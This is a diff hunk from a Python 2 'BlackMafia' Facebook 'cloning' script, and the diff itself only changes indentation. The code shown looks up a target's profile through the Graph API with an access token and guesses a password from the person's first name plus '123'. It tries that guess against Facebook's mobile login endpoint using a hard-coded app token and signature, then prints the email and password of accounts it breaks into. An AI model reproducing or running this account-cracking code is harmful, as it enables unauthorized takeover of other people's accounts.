@@ -245,13 +245,13 @@ for o in titik:
 	jalan(' \033[1;91m.................\033[1;95mCloning Start..\033[1;91m............ ')
 	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mBlackMafia\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
 	def main(arg):
-        user = arg
-        try:
-            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
-            b = json.loads(a.text)
-            # Password Guess 1
-            pass1 = b['first_name'] + '123'
-            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+		user = arg
+		try:
+			a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
+			b = json.loads(a.text)
+			# Password Guess 1
+			pass1 = b['first_name'] + '123'
+			data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
             q = json.load(data)
             if 'access_token' in q:
                 print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass1
